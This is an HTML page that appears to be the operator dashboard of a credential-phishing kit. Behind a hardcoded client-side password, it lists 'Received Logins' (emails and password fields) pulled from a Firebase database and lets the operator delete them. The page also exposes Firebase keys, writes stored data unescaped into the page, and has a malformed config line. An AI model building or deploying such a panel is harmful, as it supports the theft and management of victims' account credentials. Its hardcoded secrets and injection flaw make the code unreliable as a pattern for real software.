<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Admin Panel</title>
<style>
body{font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;background:#000;margin:0;color:#fff;}
#loginCard, #panel{background:#111;padding:20px;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,0.2);}
#panel{display:none;max-height:80vh;overflow-y:auto;width:400px;}
input{display:block;margin:10px 0;padding:8px;width:200px;}
button{padding:8px 12px;cursor:pointer;margin:2px;}
.loginEntry{display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #222;padding:4px 0;}
</style>
</head>
<body>

<div id="loginCard">
  <h2>Admin Login</h2>
  <input id="adminUser" placeholder="Username"/>
  <input id="adminPass" type="password" placeholder="Password"/>
  <button id="btnLogin">Login</button>
</div>

<div id="panel">
  <h2>Received Logins</h2>
  <div id="loginList"></div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-database.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-analytics.js";

// Firebase config (updated)
const firebaseConfig = {
  apiKey: "AIzaSyBCyr-DOgAk6fzuqiul72Lbg49XPRrOVSo",
  authDomain: "website-70f51.firebaseapp.com",
  databaseURL: "https://website-70f51-default-rtdb.firebaseio.com",
  projectId: "website-70f51",
  storageBucket: "website-70f51.firebasestorage.app",
  messagingSenderId: "989101933355",
  appId: "1:989101933355:web:5158413917817dee47fb6e",
  measurementId
};

const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
const db = getDatabase(app);

// Admin credentials
const ADMIN_USER = "blue";
const ADMIN_PASS = "shimono08";

const loginCard = document.getElementById('loginCard');
const panel = document.getElementById('panel');
const loginList = document.getElementById('loginList');

document.getElementById('btnLogin').onclick = () => {
    const user = document.getElementById('adminUser').value.trim();
    const pass = document.getElementById('adminPass').value.trim();
    
    if(user === ADMIN_USER && pass === ADMIN_PASS){
        loginCard.style.display = 'none';
        panel.style.display = 'block';

        const loginsRef = ref(db,'logins/');
        onValue(loginsRef, snapshot => {
            const data = snapshot.val();
            loginList.innerHTML = '';
            for(const k in data){
                const div = document.createElement('div');
                div.classList.add('loginEntry');
                div.innerHTML = `<span>${data[k].email} : ${data[k].pwd_hint}</span>
                                 <button onclick="deleteEntry('${k}')">Delete</button>`;
                loginList.appendChild(div);
            }
        });
    } else {
        alert('Invalid username or password');
    }
};

window.deleteEntry = function(key){
    if(confirm('Delete this login?')){
        remove(ref(db,'logins/'+key));
    }
};
</script>
</body>
</html>
